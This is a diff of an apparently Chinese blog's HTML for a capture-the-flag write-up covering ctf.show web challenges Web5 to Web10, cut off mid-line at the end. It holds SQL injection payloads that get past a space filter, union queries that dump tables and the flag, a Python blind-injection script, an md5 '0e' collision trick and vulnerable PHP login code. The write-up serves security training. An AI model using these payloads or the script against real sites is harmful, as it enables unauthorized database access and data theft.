 <p>is_numeric()函数:如果参数为数字和数字字符串则返回Ture否则Flase浮点型返回1，即 TRUE。</p>
@@ -381,86 +229,86 @@
 <p>md5碰撞介绍：<br>PHP在处理哈希字符串时，会利用”!&#x3D;”或”&#x3D;&#x3D;”来对哈希值进行比较，它把每一个以”0E”开头的哈希值都解释为0，所以如果两个不同的密码经过哈希以后，其哈希值都是以”0E”开头的，那么PHP将会认为他们相同，都是0。</p>
 <p>详情<a target="_blank" rel="noopener" href="https://blog.csdn.net/anzhuangguai/article/details/70049960">https://blog.csdn.net/anzhuangguai/article/details/70049960</a></p>
 <p>payload</p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">?v1<span class="hljs-operator">=</span>QNKCDZO<span class="hljs-operator">&amp;</span>v2<span class="hljs-operator">=</span><span class="hljs-number">240610708</span><br></code></pre></td></tr></table></figure>
-<h2 id="Web6"><a href="#Web6" class="headerlink" title="Web6"></a>Web6</h2><p><img src="/posts/fa386b67/yBGzlZCi91at7dI-165900180559753.png" srcset="/img/loading.gif" lazyload alt="image-20220308163456072"></p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?v1<span class="operator">=</span>QNKCDZO<span class="operator">&amp;</span>v2<span class="operator">=</span><span class="number">240610708</span></span><br></pre></td></tr></table></figure>
+<h2 id="Web6"><a href="#Web6" class="headerlink" title="Web6"></a>Web6</h2><p><img src="/posts/fa386b67/yBGzlZCi91at7dI-165900180559753.png" alt="image-20220308163456072"></p>
 <p>一个登录框</p>
 <p>首先试下万能密码</p>
-<p><img src="/posts/fa386b67/XwL9IrkHMRs4mVo-165900180799355.png" srcset="/img/loading.gif" lazyload alt="image-20220308163528102"></p>
+<p><img src="/posts/fa386b67/XwL9IrkHMRs4mVo-165900180799355.png" alt="image-20220308163528102"></p>
 <p>抓包看下</p>
-<p><img src="/posts/fa386b67/QmMS7b2436LWpeV-165900181035357.png" srcset="/img/loading.gif" lazyload alt="image-20220308164012827"></p>
+<p><img src="/posts/fa386b67/QmMS7b2436LWpeV-165900181035357.png" alt="image-20220308164012827"></p>
 <p>发现空格被过滤了</p>
 <p>使用&#x2F;**&#x2F;代替空格</p>
-<p><img src="/posts/fa386b67/QCr5n3YBJRK4UiE-165900181265759.png" srcset="/img/loading.gif" lazyload alt="image-20220308164039336"></p>
+<p><img src="/posts/fa386b67/QCr5n3YBJRK4UiE-165900181265759.png" alt="image-20220308164039336"></p>
 <p>登录成功 接下来猜字段</p>
-<p><img src="/posts/fa386b67/jE2Js8S9QbZqTrU.png" srcset="/img/loading.gif" lazyload alt="image-20220308164922763"></p>
+<p><img src="/posts/fa386b67/jE2Js8S9QbZqTrU.png" alt="image-20220308164922763"></p>
 <p>3个字段 继续使用union 查看回显</p>
-<p><img src="/posts/fa386b67/bMl86JAiyUjoQ2I.png" srcset="/img/loading.gif" lazyload alt="image-20220308165004852"></p>
+<p><img src="/posts/fa386b67/bMl86JAiyUjoQ2I.png" alt="image-20220308165004852"></p>
 <p>2处为回显</p>
 <p>接下来进行注入</p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sql">#查看数据库<br>username<span class="hljs-operator">=</span>admin<span class="hljs-operator">%</span><span class="hljs-number">27</span><span class="hljs-comment">/**/</span><span class="hljs-keyword">or</span><span class="hljs-comment">/**/</span><span class="hljs-number">1</span><span class="hljs-operator">%</span><span class="hljs-number">3</span>D1<span class="hljs-comment">/**/</span><span class="hljs-keyword">union</span><span class="hljs-comment">/**/</span><span class="hljs-keyword">select</span><span class="hljs-comment">/**/</span><span class="hljs-number">1</span>,database(),<span class="hljs-number">3</span><span class="hljs-operator">%</span><span class="hljs-number">23</span><span class="hljs-operator">&amp;</span>password<span class="hljs-operator">=</span><span class="hljs-number">1</span><br></code></pre></td></tr></table></figure>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#查看数据库</span><br><span class="line">username<span class="operator">=</span>admin<span class="operator">%</span><span class="number">27</span><span class="comment">/**/</span><span class="keyword">or</span><span class="comment">/**/</span><span class="number">1</span><span class="operator">%</span><span class="number">3</span>D1<span class="comment">/**/</span><span class="keyword">union</span><span class="comment">/**/</span><span class="keyword">select</span><span class="comment">/**/</span><span class="number">1</span>,database(),<span class="number">3</span><span class="operator">%</span><span class="number">23</span><span class="operator">&amp;</span>password<span class="operator">=</span><span class="number">1</span></span><br></pre></td></tr></table></figure>
 
-<p><img src="/posts/fa386b67/yiXDlJ8wbvjensg-165900182072165.png" srcset="/img/loading.gif" lazyload alt="image-20220308165558090"></p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sql">#查表<br>username<span class="hljs-operator">=</span>admin<span class="hljs-operator">%</span><span class="hljs-number">27</span><span class="hljs-comment">/**/</span><span class="hljs-keyword">or</span><span class="hljs-comment">/**/</span><span class="hljs-number">1</span><span class="hljs-operator">%</span><span class="hljs-number">3</span>D1<span class="hljs-comment">/**/</span><span class="hljs-keyword">union</span><span class="hljs-comment">/**/</span><span class="hljs-keyword">select</span><span class="hljs-comment">/**/</span><span class="hljs-number">1</span>,group_concat(table_name),<span class="hljs-number">3</span><span class="hljs-comment">/**/</span><span class="hljs-keyword">from</span><span class="hljs-comment">/**/</span>information_schema.tables<span class="hljs-comment">/**/</span><span class="hljs-keyword">where</span><span class="hljs-comment">/**/</span>table_schema<span class="hljs-operator">=</span>database()<span class="hljs-operator">%</span><span class="hljs-number">23</span><span class="hljs-operator">&amp;</span>password<span class="hljs-operator">=</span><span class="hljs-number">1</span><br></code></pre></td></tr></table></figure>
+<p><img src="/posts/fa386b67/yiXDlJ8wbvjensg-165900182072165.png" alt="image-20220308165558090"></p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#查表</span><br><span class="line">username<span class="operator">=</span>admin<span class="operator">%</span><span class="number">27</span><span class="comment">/**/</span><span class="keyword">or</span><span class="comment">/**/</span><span class="number">1</span><span class="operator">%</span><span class="number">3</span>D1<span class="comment">/**/</span><span class="keyword">union</span><span class="comment">/**/</span><span class="keyword">select</span><span class="comment">/**/</span><span class="number">1</span>,group_concat(table_name),<span class="number">3</span><span class="comment">/**/</span><span class="keyword">from</span><span class="comment">/**/</span>information_schema.tables<span class="comment">/**/</span><span class="keyword">where</span><span class="comment">/**/</span>table_schema<span class="operator">=</span>database()<span class="operator">%</span><span class="number">23</span><span class="operator">&amp;</span>password<span class="operator">=</span><span class="number">1</span></span><br></pre></td></tr></table></figure>
 
-<p><img src="/posts/fa386b67/9zPsoXm173dNgGw-165900182504967.png" srcset="/img/loading.gif" lazyload alt="image-20220308165542589"></p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sql">#查字段<br>username<span class="hljs-operator">=</span>admin<span class="hljs-operator">%</span><span class="hljs-number">27</span><span class="hljs-comment">/**/</span><span class="hljs-keyword">or</span><span class="hljs-comment">/**/</span><span class="hljs-number">1</span><span class="hljs-operator">%</span><span class="hljs-number">3</span>D1<span class="hljs-comment">/**/</span><span class="hljs-keyword">union</span><span class="hljs-comment">/**/</span><span class="hljs-keyword">select</span><span class="hljs-comment">/**/</span><span class="hljs-number">1</span>,group_concat(column_name),<span class="hljs-number">3</span><span class="hljs-comment">/**/</span><span class="hljs-keyword">from</span><span class="hljs-comment">/**/</span>information_schema.columns<span class="hljs-comment">/**/</span><span class="hljs-keyword">where</span><span class="hljs-comment">/**/</span>table_name<span class="hljs-operator">=</span><span class="hljs-string">&#x27;flag&#x27;</span><span class="hljs-operator">%</span><span class="hljs-number">23</span><span class="hljs-operator">&amp;</span>password<span class="hljs-operator">=</span><span class="hljs-number">1</span><br></code></pre></td></tr></table></figure>
+<p><img src="/posts/fa386b67/9zPsoXm173dNgGw-165900182504967.png" alt="image-20220308165542589"></p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#查字段</span><br><span class="line">username<span class="operator">=</span>admin<span class="operator">%</span><span class="number">27</span><span class="comment">/**/</span><span class="keyword">or</span><span class="comment">/**/</span><span class="number">1</span><span class="operator">%</span><span class="number">3</span>D1<span class="comment">/**/</span><span class="keyword">union</span><span class="comment">/**/</span><span class="keyword">select</span><span class="comment">/**/</span><span class="number">1</span>,group_concat(column_name),<span class="number">3</span><span class="comment">/**/</span><span class="keyword">from</span><span class="comment">/**/</span>information_schema.columns<span class="comment">/**/</span><span class="keyword">where</span><span class="comment">/**/</span>table_name<span class="operator">=</span><span class="string">&#x27;flag&#x27;</span><span class="operator">%</span><span class="number">23</span><span class="operator">&amp;</span>password<span class="operator">=</span><span class="number">1</span></span><br></pre></td></tr></table></figure>
 
-<p><img src="/posts/fa386b67/mnWQfT94YyG1N83-165900182771769.png" srcset="/img/loading.gif" lazyload alt="image-20220308165841243"></p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sql">#查数据<br>username<span class="hljs-operator">=</span>admin<span class="hljs-operator">%</span><span class="hljs-number">27</span><span class="hljs-comment">/**/</span><span class="hljs-keyword">or</span><span class="hljs-comment">/**/</span><span class="hljs-number">1</span><span class="hljs-operator">%</span><span class="hljs-number">3</span>D1<span class="hljs-comment">/**/</span><span class="hljs-keyword">union</span><span class="hljs-comment">/**/</span><span class="hljs-keyword">select</span><span class="hljs-comment">/**/</span><span class="hljs-number">1</span>,flag,<span class="hljs-number">3</span><span class="hljs-comment">/**/</span><span class="hljs-keyword">from</span><span class="hljs-comment">/**/</span>flag<span class="hljs-operator">%</span><span class="hljs-number">23</span><span class="hljs-operator">&amp;</span>password<span class="hljs-operator">=</span><span class="hljs-number">1</span><br></code></pre></td></tr></table></figure>
+<p><img src="/posts/fa386b67/mnWQfT94YyG1N83-165900182771769.png" alt="image-20220308165841243"></p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#查数据</span><br><span class="line">username<span class="operator">=</span>admin<span class="operator">%</span><span class="number">27</span><span class="comment">/**/</span><span class="keyword">or</span><span class="comment">/**/</span><span class="number">1</span><span class="operator">%</span><span class="number">3</span>D1<span class="comment">/**/</span><span class="keyword">union</span><span class="comment">/**/</span><span class="keyword">select</span><span class="comment">/**/</span><span class="number">1</span>,flag,<span class="number">3</span><span class="comment">/**/</span><span class="keyword">from</span><span class="comment">/**/</span>flag<span class="operator">%</span><span class="number">23</span><span class="operator">&amp;</span>password<span class="operator">=</span><span class="number">1</span></span><br></pre></td></tr></table></figure>
 
 <p>得到flag</p>
 <h2 id="Web7"><a href="#Web7" class="headerlink" title="Web7"></a>Web7</h2><p>随便点一个</p>
-<p><img src="/posts/fa386b67/MNYT1oehSVHamZv.png" srcset="/img/loading.gif" lazyload alt="image-20220309233612766"></p>
+<p><img src="/posts/fa386b67/MNYT1oehSVHamZv.png" alt="image-20220309233612766"></p>
 <p>看url应该是sql注入</p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">1</span> <span class="hljs-keyword">and</span> <span class="hljs-number">1</span><span class="hljs-operator">=</span><span class="hljs-number">1</span>#<br></code></pre></td></tr></table></figure>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span><span class="number">1</span>#</span><br></pre></td></tr></table></figure>
 
-<p><img src="/posts/fa386b67/34opSrgjQGvZdKw-165900183166571.png" srcset="/img/loading.gif" lazyload alt="image-20220309233721194"></p>
+<p><img src="/posts/fa386b67/34opSrgjQGvZdKw-165900183166571.png" alt="image-20220309233721194"></p>
 <p>抓包看下</p>
 <p>应该是空格被过滤了</p>
 <p>用&#x2F;**&#x2F;试下</p>
-<p><img src="/posts/fa386b67/ekz96oF8faOEXBr-165900183700675.png" srcset="/img/loading.gif" lazyload alt="image-20220309234057695"></p>
+<p><img src="/posts/fa386b67/ekz96oF8faOEXBr-165900183700675.png" alt="image-20220309234057695"></p>
 <p>正常了</p>
 <p>看回显</p>
-<p><img src="/posts/fa386b67/aEdQO9VhzUipkKr-165900184015977.png" srcset="/img/loading.gif" lazyload alt="image-20220309234458637"></p>
+<p><img src="/posts/fa386b67/aEdQO9VhzUipkKr-165900184015977.png" alt="image-20220309234458637"></p>
 <p>2，3</p>
 <p>根据前面的题盲猜应该还是flag表</p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">id<span class="hljs-operator">=</span><span class="hljs-number">-1</span><span class="hljs-comment">/**/</span><span class="hljs-keyword">union</span><span class="hljs-comment">/**/</span><span class="hljs-keyword">select</span><span class="hljs-comment">/**/</span><span class="hljs-number">1</span>,flag,<span class="hljs-number">3</span><span class="hljs-comment">/**/</span><span class="hljs-keyword">from</span><span class="hljs-comment">/**/</span>flag<span class="hljs-operator">%</span><span class="hljs-number">23</span><br></code></pre></td></tr></table></figure>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">-1</span><span class="comment">/**/</span><span class="keyword">union</span><span class="comment">/**/</span><span class="keyword">select</span><span class="comment">/**/</span><span class="number">1</span>,flag,<span class="number">3</span><span class="comment">/**/</span><span class="keyword">from</span><span class="comment">/**/</span>flag<span class="operator">%</span><span class="number">23</span></span><br></pre></td></tr></table></figure>
 
-<p><img src="/posts/fa386b67/kSiKWDsMnBgLT5u-165900184312779.png" srcset="/img/loading.gif" lazyload alt="image-20220309234528344"></p>
+<p><img src="/posts/fa386b67/kSiKWDsMnBgLT5u-165900184312779.png" alt="image-20220309234528344"></p>
 <h2 id="Web8"><a href="#Web8" class="headerlink" title="Web8"></a>Web8</h2><p>和上一关一样存在sql注入</p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-comment">/**/</span><span class="hljs-keyword">or</span><span class="hljs-comment">/**/</span><span class="hljs-number">1</span><span class="hljs-operator">=</span><span class="hljs-number">1</span>#<br></code></pre></td></tr></table></figure>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="comment">/**/</span><span class="keyword">or</span><span class="comment">/**/</span><span class="number">1</span><span class="operator">=</span><span class="number">1</span>#</span><br></pre></td></tr></table></figure>
 
-<p><img src="/posts/fa386b67/image-20220310225247255.png" srcset="/img/loading.gif" lazyload alt="image-20220310225247255"></p>
+<p><img src="/posts/fa386b67/image-20220310225247255.png" alt="image-20220310225247255"></p>
 <p>使用union看回显</p>
-<p><img src="/posts/fa386b67/image-20220310225316125.png" srcset="/img/loading.gif" lazyload alt="image-20220310225316125"></p>
+<p><img src="/posts/fa386b67/image-20220310225316125.png" alt="image-20220310225316125"></p>
 <p>报错了</p>
 <p>应该是过滤了union或者select</p>
 <p>这里使用盲注</p>
 <p>脚本</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br>s=requests.session()<br>url=<span class="hljs-string">&#x27;http://273325e5-2d7d-49b3-ab29-95181b40a737.challenge.ctf.show/index.php&#x27;</span><br>table=<span class="hljs-string">&quot;&quot;</span><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">45</span>):<br>    <span class="hljs-built_in">print</span>(i)<br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">31</span>,<span class="hljs-number">128</span>):<br>        <span class="hljs-comment">#爆表名  flag</span><br>        <span class="hljs-comment">#payload = &quot;ascii(substr((select/**/group_concat(table_name)/**/from/**/information_schema.tables/**/where/**/table_schema=database())from/**/%s/**/for/**/1))=%s#&quot;%(str(i),str(j))</span><br>        <span class="hljs-comment">#爆字段名 flag</span><br>        <span class="hljs-comment">#payload = &quot;ascii(substr((select/**/group_concat(column_name)/**/from/**/information_schema.columns/**/where/**/table_name=0x666C6167)from/**/%s/**/for/**/1))=%s#&quot;%(str(i),str(j))</span><br>        <span class="hljs-comment">#读取flag</span><br>        payload = <span class="hljs-string">&quot;ascii(substr((select/**/flag/**/from/**/flag)from/**/%s/**/for/**/1))=%s#&quot;</span>%(<span class="hljs-built_in">str</span>(i), <span class="hljs-built_in">str</span>(j))<br><br>        ra = s.get(url=url + <span class="hljs-string">&#x27;?id=0/**/or/**/&#x27;</span> + payload).text<br><br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;I asked nothing&#x27;</span> <span class="hljs-keyword">in</span> ra:<br>            table += <span class="hljs-built_in">chr</span>(j)<br>            <span class="hljs-built_in">print</span>(table)<br>            <span class="hljs-keyword">break</span><br></code></pre></td></tr></table></figure>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">s=requests.session()</span><br><span class="line">url=<span class="string">&#x27;http://273325e5-2d7d-49b3-ab29-95181b40a737.challenge.ctf.show/index.php&#x27;</span></span><br><span class="line">table=<span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">45</span>):</span><br><span class="line">    <span class="built_in">print</span>(i)</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">31</span>,<span class="number">128</span>):</span><br><span class="line">        <span class="comment">#爆表名  flag</span></span><br><span class="line">        <span class="comment">#payload = &quot;ascii(substr((select/**/group_concat(table_name)/**/from/**/information_schema.tables/**/where/**/table_schema=database())from/**/%s/**/for/**/1))=%s#&quot;%(str(i),str(j))</span></span><br><span class="line">        <span class="comment">#爆字段名 flag</span></span><br><span class="line">        <span class="comment">#payload = &quot;ascii(substr((select/**/group_concat(column_name)/**/from/**/information_schema.columns/**/where/**/table_name=0x666C6167)from/**/%s/**/for/**/1))=%s#&quot;%(str(i),str(j))</span></span><br><span class="line">        <span class="comment">#读取flag</span></span><br><span class="line">        payload = <span class="string">&quot;ascii(substr((select/**/flag/**/from/**/flag)from/**/%s/**/for/**/1))=%s#&quot;</span>%(<span class="built_in">str</span>(i), <span class="built_in">str</span>(j))</span><br><span class="line"></span><br><span class="line">        ra = s.get(url=url + <span class="string">&#x27;?id=0/**/or/**/&#x27;</span> + payload).text</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;I asked nothing&#x27;</span> <span class="keyword">in</span> ra:</span><br><span class="line">            table += <span class="built_in">chr</span>(j)</span><br><span class="line">            <span class="built_in">print</span>(table)</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure>
 
 <p>flag:</p>
-<p><img src="/posts/fa386b67/image-20220310232534339.png" srcset="/img/loading.gif" lazyload alt="image-20220310232534339"></p>
-<h2 id="Web9"><a href="#Web9" class="headerlink" title="Web9"></a>Web9</h2><p><img src="/posts/fa386b67/image-20220311212421282.png" srcset="/img/loading.gif" lazyload alt="image-20220311212421282"></p>
+<p><img src="/posts/fa386b67/image-20220310232534339.png" alt="image-20220310232534339"></p>
+<h2 id="Web9"><a href="#Web9" class="headerlink" title="Web9"></a>Web9</h2><p><img src="/posts/fa386b67/image-20220311212421282.png" alt="image-20220311212421282"></p>
 <p>打开就是一个登录界面，只有账号没有密码</p>
 <p>本以为是sql注入，但试了很多payload都没有回显</p>
 <p>使用目录扫描工具扫下</p>
 <p>发现robots.txt</p>
-<p><img src="/posts/fa386b67/image-20220311213312985.png" srcset="/img/loading.gif" lazyload alt="image-20220311213312985"></p>
+<p><img src="/posts/fa386b67/image-20220311213312985.png" alt="image-20220311213312985"></p>
 <p>看下是什么</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>        <span class="hljs-variable">$flag</span>=<span class="hljs-string">&quot;&quot;</span>;<br>		<span class="hljs-variable">$password</span>=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;password&#x27;</span>];<br>		<span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$password</span>)&gt;<span class="hljs-number">10</span>)&#123;<br>			<span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;password error&quot;</span>);<br>		&#125;<br>		<span class="hljs-variable">$sql</span>=<span class="hljs-string">&quot;select * from user where username =&#x27;admin&#x27; and password =&#x27;&quot;</span>.<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$password</span>,<span class="hljs-literal">true</span>).<span class="hljs-string">&quot;&#x27;&quot;</span>;<br>		<span class="hljs-variable">$result</span>=<span class="hljs-title function_ invoke__">mysqli_query</span>(<span class="hljs-variable">$con</span>,<span class="hljs-variable">$sql</span>);<br>			<span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">mysqli_num_rows</span>(<span class="hljs-variable">$result</span>)&gt;<span class="hljs-number">0</span>)&#123;<br>					<span class="hljs-keyword">while</span>(<span class="hljs-variable">$row</span>=<span class="hljs-title function_ invoke__">mysqli_fetch_assoc</span>(<span class="hljs-variable">$result</span>))&#123;<br>						 <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;登陆成功&lt;br&gt;&quot;</span>;<br>						 <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br>					 &#125;<br>			&#125;<br><span class="hljs-meta">?&gt;</span><br><br></code></pre></td></tr></table></figure>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">        <span class="variable">$flag</span>=<span class="string">&quot;&quot;</span>;</span><br><span class="line">		<span class="variable">$password</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line">		<span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$password</span>)&gt;<span class="number">10</span>)&#123;</span><br><span class="line">			<span class="keyword">die</span>(<span class="string">&quot;password error&quot;</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="variable">$sql</span>=<span class="string">&quot;select * from user where username =&#x27;admin&#x27; and password =&#x27;&quot;</span>.<span class="title function_ invoke__">md5</span>(<span class="variable">$password</span>,<span class="literal">true</span>).<span class="string">&quot;&#x27;&quot;</span>;</span><br><span class="line">		<span class="variable">$result</span>=<span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$con</span>,<span class="variable">$sql</span>);</span><br><span class="line">			<span class="keyword">if</span>(<span class="title function_ invoke__">mysqli_num_rows</span>(<span class="variable">$result</span>)&gt;<span class="number">0</span>)&#123;</span><br><span class="line">					<span class="keyword">while</span>(<span class="variable">$row</span>=<span class="title function_ invoke__">mysqli_fetch_assoc</span>(<span class="variable">$result</span>))&#123;</span><br><span class="line">						 <span class="keyword">echo</span> <span class="string">&quot;登陆成功&lt;br&gt;&quot;</span>;</span><br><span class="line">						 <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">					 &#125;</span><br><span class="line">			&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
 
 <p>可以看到sql语句为</p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">$<span class="hljs-keyword">sql</span><span class="hljs-operator">=</span>&quot;select * from user where username =&#x27;admin&#x27; and password =&#x27;&quot;.md5($password,<span class="hljs-literal">true</span>).&quot;&#x27;&quot;;   <br></code></pre></td></tr></table></figure>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$<span class="keyword">sql</span><span class="operator">=</span>&quot;select * from user where username =&#x27;admin&#x27; and password =&#x27;&quot;.md5($password,<span class="literal">true</span>).&quot;&#x27;&quot;;   </span><br></pre></td></tr></table></figure>
 
-<p><img src="/posts/fa386b67/image-20220311213635981.png" srcset="/img/loading.gif" lazyload alt="image-20220311213635981"></p>
+<p><img src="/posts/fa386b67/image-20220311213635981.png" alt="image-20220311213635981"></p>
 <p>也就是我们的passwd要传入一个经过md5加密后16进制转字符串后包含‘or’的值</p>
 <p>例如：<strong>ffifdyop</strong></p>
-<p><img src="/posts/fa386b67/image-20220311214754459.png" srcset="/img/loading.gif" lazyload alt="image-20220311214754459"></p>
+<p><img src="/posts/fa386b67/image-20220311214754459.png" alt="image-20220311214754459"></p>
 <h2 id="Web10"><a href="#Web10" class="headerlink" title="Web10"></a>Web10</h2><p>打开又是一个登录框</p>
-<p><img src="/posts/fa386b67/image-20220312212750883.png" srcset="/img/loading.gif" lazyload alt="image-20220312212750883"></p>
+<p><img src="/posts/fa386b67/image-20220312212750883.png" alt="image-20220312212750883"></p>
 <p>点击取消出现源码</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>		<span class="hljs-variable">$flag</span>=<span class="hljs-string">&quot;&quot;</span>;<br>        <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">replaceSpecialChar</span>(<span class="hljs-params"><span class="hljs-variable">$strParam</span></span>)</span>&#123;<br>             <span class="hljs-variable">$regex</span> = <span class="hljs-string">&quot;/(select|from|where|join|sleep|and|\s|union|,)/i&quot;</span>;<br>             <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-variable">$regex</span>,<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-variable">$strParam</span>);<br>        &#125;<br>        <span class="hljs-keyword">if</span> (!<span class="hljs-variable">$con</span>)<br>        &#123;<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;Could not connect: &#x27;</span> . <span class="hljs-title function_ invoke__">mysqli_error</span>());<br>        &#125;<br>		<span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$username</span>)!=<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-title function_ invoke__">replaceSpecialChar</span>(<span class="hljs-variable">$username</span>)))&#123;<br>			<span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;sql inject error&quot;</span>);<br>		&#125;<br>		<span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$password</span>)!=<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-title function_ invoke__">replaceSpecialChar</span>(<span 